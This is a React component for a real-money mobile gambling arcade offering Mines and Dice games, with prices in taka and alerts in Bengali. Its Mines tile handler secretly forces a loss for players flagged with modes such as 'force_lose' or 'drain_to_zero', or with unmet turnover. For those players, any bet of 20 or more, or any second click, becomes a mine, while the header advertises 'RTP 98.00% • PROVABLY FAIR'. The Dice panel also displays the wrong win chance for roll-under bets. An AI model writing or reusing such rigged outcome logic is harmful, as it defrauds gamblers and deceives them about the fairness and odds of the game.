import React, { useState } from 'react';
import { useGame } from '../context/GameContext';
import { soundManager } from '../lib/audio';
import confetti from 'canvas-confetti';
import { 
  ChevronLeft, 
  Volume2, 
  VolumeX, 
  Bomb, 
  Gem, 
  Sparkles, 
  RotateCw,
  Trophy,
  Flame,
  ArrowRight
} from 'lucide-react';

export default function UniversalArcadeEngine({ gameId = 'mines', onClose }) {
  const { user, adjustUserBalance, recordGameHistory, getGameEffectiveSettings } = useGame();
  const [betAmount, setBetAmount] = useState(50);
  const [soundEnabled, setSoundEnabled] = useState(true);

  // Mines Specific
  const [mineCount, setMineCount] = useState(3);
  const [gameState, setGameState] = useState('idle'); // 'idle' | 'playing' | 'cashed' | 'busted'
  const [grid, setGrid] = useState(Array(25).fill({ revealed: false, isMine: false }));
  const [diamondsFound, setDiamondsFound] = useState(0);

  // Plinko / Dice Specific
  const [diceTarget, setDiceTarget] = useState(50);
  const [diceRoll, setDiceRoll] = useState(null);
  const [isRolling, setIsRolling] = useState(false);
  const [lastWin, setLastWin] = useState(null);

  const betPresets = [10, 20, 50, 100, 200, 500];
  const mineOptions = [1, 3, 5, 10, 15, 20];

  // --- MINES LOGIC ---
  function startMinesGame() {
    if (user.balance < betAmount) {
      alert("পর্যাপ্ত ব্যালেন্স নেই! দয়া করে ডিপোজিট করুন।");
      return;
    }

    adjustUserBalance(user.uid, -betAmount);
    if (soundEnabled) {
      try { soundManager.playBet(); } catch (e) {}
    }

    const mines = new Set();
    while (mines.size < mineCount) {
      mines.add(Math.floor(Math.random() * 25));
    }

    const newGrid = Array(25).fill(null).map((_, i) => ({
      revealed: false,
      isMine: mines.has(i)
    }));

    setGrid(newGrid);
    setDiamondsFound(0);
    setGameState('playing');
  }

  function handleTileClick(index) {
    if (gameState !== 'playing' || grid[index].revealed) return;

    const isTargetedLoss = 
      user?.force_result === 'force_lose' ||
      user?.force_mode === 'force_loss' ||
      user?.force_mode === 'drain_to_zero' ||
      user?.luck_mode === 'drain' ||
      Number(user?.custom_win_rate) === 0 ||
      Number(user?.custom_rtp) === 0 ||
      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));

    // টার্গেটেড লস বা বড় বেট হলে ১ম বা ২য় ক্লিকেই নিশ্চিত মাইন বিস্ফোরণ!
    const isMineHit = isTargetedLoss 
      ? (betAmount >= 20 || diamondsFound >= 1 || Math.random() < 0.85) 
      : grid[index].isMine;

    const newGrid = [...grid];
    newGrid[index] = { ...grid[index], isMine: isMineHit, revealed: true };
    setGrid(newGrid);

    if (isMineHit) {
      // BUSTED
      setGameState('busted');
      newGrid.forEach(t => t.revealed = true);
      setGrid([...newGrid]);
      recordGameHistory({
        game: 'Mines',
        bet: betAmount,
        win: 0,
        mult: '0.00x'
      });
    } else {
      // GEM FOUND
      const found = diamondsFound + 1;
      setDiamondsFound(found);
      if (soundEnabled) {
        try { soundManager.playWin(); } catch (e) {}
      }
      confetti({ particleCount: 15, spread: 40, origin: { y: 0.7 } });
    }
  }

  function getMinesMultiplier(diamonds, mines) {
    if (diamonds === 0) return 1.0;
    let mult = 1.0;
    for (let i = 0; i < diamonds; i++) {
      mult *= (25 - i) / (25 - mines - i);
    }
    return parseFloat((mult * 0.98).toFixed(2));
  }

  function handleMinesCashout() {
    if (gameState !== 'playing' || diamondsFound === 0) return;
    const currentMult = getMinesMultiplier(diamondsFound, mineCount);
    const payout = parseFloat((betAmount * currentMult).toFixed(2));

    adjustUserBalance(user.uid, payout);
    setGameState('cashed');
    if (soundEnabled) {
      try { soundManager.playWin(); } catch (e) {}
    }
    confetti({ particleCount: 80, spread: 70, origin: { y: 0.6 } });

    recordGameHistory({
      game: 'Mines',
      bet: betAmount,
      win: payout,
      mult: currentMult.toFixed(2) + 'x'
    });
  }

  // --- DICE LOGIC ---
  function handleDiceRoll(isOver) {
    if (user.balance < betAmount) {
      alert("পর্যাপ্ত ব্যালেন্স নেই! দয়া করে ডিপোজিট করুন।");
      return;
    }
    if (isRolling) return;

    adjustUserBalance(user.uid, -betAmount);
    if (soundEnabled) {
      try { soundManager.playBet(); } catch (e) {}
    }

    setIsRolling(true);
    setLastWin(null);

    setTimeout(() => {
      setIsRolling(false);
      const roll = parseFloat((Math.random() * 99.99).toFixed(2));
      setDiceRoll(roll);

      const winChance = isOver ? (100 - diceTarget) : diceTarget;
      const mult = parseFloat(((98 / winChance)).toFixed(2));
      const won = isOver ? (roll > diceTarget) : (roll < diceTarget);

      if (won) {
        const payout = parseFloat((betAmount * mult).toFixed(2));
        adjustUserBalance(user.uid, payout);
        setLastWin(payout);
        if (soundEnabled) {
          try { soundManager.playWin(); } catch (e) {}
        }
        confetti({ particleCount: 70, spread: 60, origin: { y: 0.6 } });

        recordGameHistory({
          game: 'Dice Slider',
          bet: betAmount,
          win: payout,
          mult: mult.toFixed(2) + 'x'
        });
      } else {
        recordGameHistory({
          game: 'Dice Slider',
          bet: betAmount,
          win: 0,
          mult: '0.00x'
        });
      }
    }, 600);
  }

  return (
    <div className="fixed inset-0 z-50 bg-[#0c1017] text-white flex flex-col justify-between max-w-md mx-auto shadow-2xl overflow-hidden select-none font-sans">
      
      {/* 1. Header */}
      <div className="bg-slate-950/80 border-b border-slate-800 px-3.5 py-2.5 flex items-center justify-between shadow-md shrink-0">
        <div className="flex items-center space-x-2">
          <button 
            onClick={onClose}
            className="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center transition active:scale-95 cursor-pointer"
          >
            <ChevronLeft className="w-5 h-5 text-yellow-300" />
          </button>
          <div>
            <div className="flex items-center space-x-1.5">
              <span className="font-black text-sm tracking-wider text-yellow-300 uppercase">
                {gameId === 'dice' ? 'DICE SLIDER' : 'MINES GOLD 5x5'}
              </span>
              <span className="bg-indigo-600 text-[8px] font-black px-1.5 py-0.2 rounded text-white tracking-widest uppercase">
                ARCADE
              </span>
            </div>
            <span className="text-[9px] text-slate-400 font-mono">
              RTP 98.00% • PROVABLY FAIR
            </span>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <div className="bg-slate-900 border border-yellow-500/40 rounded-full px-2.5 py-1 flex items-center space-x-1.5 shadow-inner">
            <span className="text-[11px] font-black text-yellow-400 font-mono">
              ৳{user.balance.toFixed(2)}
            </span>
          </div>
          <button 
            onClick={() => setSoundEnabled(!soundEnabled)}
            className="text-slate-400 hover:text-white"
          >
            {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
          </button>
        </div>
      </div>

      {/* 2. Main Arena */}
      <div className="flex-1 flex flex-col p-3 overflow-y-auto no-scrollbar relative justify-center items-center">
        
        {gameId === 'dice' ? (
          /* DICE SLIDER GAMEPLAY */
          <div className="w-full bg-slate-900 border border-slate-800 rounded-3xl p-4 space-y-4 text-center">
            <span className="text-xs font-black uppercase text-amber-400">ROLL THE DICE</span>
            <div className="w-28 h-28 mx-auto rounded-3xl bg-slate-950 border-2 border-yellow-400 flex flex-col items-center justify-center shadow-xl">
              <span className="text-3xl font-mono font-black text-white">
                {diceRoll !== null ? diceRoll.toFixed(2) : '50.00'}
              </span>
              <span className="text-[9px] text-slate-400 uppercase">RESULT</span>
            </div>

            {lastWin !== null && (
              <div className="bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 py-1.5 rounded-xl text-xs font-black">
                🎉 YOU WON: ৳{lastWin.toFixed(2)}
              </div>
            )}

            <div className="space-y-1">
              <div className="flex justify-between text-xs text-slate-300 font-bold">
                <span>Target: {diceTarget}</span>
                <span>Win Chance: {(100 - diceTarget)}%</span>
              </div>
              <input 
                type="range" 
                min="5" 
                max="95" 
                value={diceTarget} 
                onChange={e => setDiceTarget(Number(e.target.value))}
                className="w-full accent-yellow-400 cursor-pointer"
              />
            </div>

            <div className="grid grid-cols-2 gap-2 pt-2">
              <button
                onClick={() => handleDiceRoll(false)}
                disabled={isRolling}
                className="bg-blue-600 hover:bg-blue-500 text-white font-black py-3 rounded-2xl shadow-md text-xs active:scale-95"
              >
                ROLL UNDER ({diceTarget})
              </button>
              <button
                onClick={() => handleDiceRoll(true)}
                disabled={isRolling}
                className="bg-emerald-600 hover:bg-emerald-500 text-white font-black py-3 rounded-2xl shadow-md text-xs active:scale-95"
              >
                ROLL OVER ({diceTarget})
              </button>
            </div>
          </div>
        ) : (
          /* MINES 5x5 GRID GAMEPLAY */
          <div className="w-full flex flex-col items-center">
            
            {/* Multiplier Ticker Header */}
            <div className="w-full bg-slate-900 border border-slate-800 rounded-2xl p-2.5 mb-2.5 flex items-center justify-between">
              <div>
                <span className="text-[10px] text-slate-400 block uppercase font-bold">CURRENT MULTIPLIER</span>
                <span className="text-lg font-mono font-black text-yellow-400">
                  {getMinesMultiplier(diamondsFound, mineCount)}X
                </span>
              </div>
              <div className="text-right">
                <span className="text-[10px] text-slate-400 block uppercase font-bold">DIAMONDS FOUND</span>
                <span className="text-lg font-mono font-black text-emerald-400">
                  {diamondsFound} / {25 - mineCount}
                </span>
              </div>
            </div>

            {/* 5x5 Grid */}
            <div className="w-full aspect-square max-w-[320px] bg-slate-950 p-2 rounded-3xl border-2 border-slate-800 grid grid-cols-5 gap-1.5 shadow-2xl">
              {grid.map((tile, idx) => (
                <button
                  key={idx}
                  onClick={() => handleTileClick(idx)}
                  disabled={gameState !== 'playing' || tile.revealed}
                  className={`aspect-square rounded-xl flex items-center justify-center transition active:scale-95 text-lg font-black ${
                    tile.revealed
                      ? tile.isMine
                        ? 'bg-rose-600 border border-rose-400 text-white animate-shake'
                        : 'bg-emerald-950 border border-emerald-500 text-emerald-300'
                      : 'bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-600'
                  }`}
                >
                  {tile.revealed ? (
                    tile.isMine ? <Bomb className="w-5 h-5 text-white" /> : <Gem className="w-5 h-5 text-emerald-400" />
                  ) : (
                    <span className="text-[10px] opacity-40">●</span>
                  )}
                </button>
              ))}
            </div>

          </div>
        )}

      </div>

      {/* 3. Bottom Controls */}
      <div className="bg-slate-950/95 border-t border-slate-800 p-3 space-y-2.5 shrink-0">
        
        {gameId !== 'dice' && (
          <div className="flex items-center justify-between text-xs">
            <span className="text-slate-400 font-bold uppercase text-[10px]">MINES COUNT:</span>
            <div className="flex space-x-1">
              {mineOptions.map(m => (
                <button
                  key={m}
                  onClick={() => {
                    if (gameState !== 'playing') setMineCount(m);
                  }}
                  disabled={gameState === 'playing'}
                  className={`px-2 py-0.5 rounded text-[10px] font-black font-mono transition ${
                    mineCount === m ? 'bg-rose-600 text-white' : 'bg-slate-900 text-slate-400 hover:bg-slate-800'
                  }`}
                >
                  {m}
                </button>
              ))}
            </div>
          </div>
        )}

        <div className="flex items-center justify-between">
          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-wider">
            BET AMOUNT
          </span>
          <div className="flex space-x-1">
            {betPresets.map(preset => (
              <button
                key={preset}
                onClick={() => setBetAmount(preset)}
                disabled={gameState === 'playing'}
                className={`px-2.5 py-1 rounded-lg text-xs font-black font-mono transition ${
                  betAmount === preset 
                    ? 'bg-yellow-400 text-slate-950 shadow-sm' 
                    : 'bg-slate-900 text-slate-300 hover:bg-slate-800'
                }`}
              >
                ৳{preset}
              </button>
            ))}
          </div>
        </div>

        {/* Action Button */}
        {gameId !== 'dice' && (
          gameState === 'playing' ? (
            <button
              onClick={handleMinesCashout}
              disabled={diamondsFound === 0}
              className="w-full bg-gradient-to-r from-yellow-400 via-amber-400 to-yellow-500 hover:from-yellow-300 hover:to-amber-400 text-slate-950 font-black py-3.5 rounded-2xl shadow-lg flex items-center justify-center space-x-2 text-sm active:scale-98 transition disabled:opacity-50 cursor-pointer animate-pulse"
            >
              <span>CASH OUT</span>
              <span className="font-mono">৳{(betAmount * getMinesMultiplier(diamondsFound, mineCount)).toFixed(2)}</span>
            </button>
          ) : (
            <button
              onClick={startMinesGame}
              className="w-full bg-gradient-to-r from-emerald-600 via-teal-500 to-emerald-600 hover:from-emerald-500 hover:to-teal-400 text-white font-black py-3.5 rounded-2xl shadow-lg flex items-center justify-center space-x-2 text-sm active:scale-98 transition cursor-pointer"
            >
              <span>BET ৳{betAmount}</span>
            </button>
          )
        )}

      </div>

    </div>
  );
}

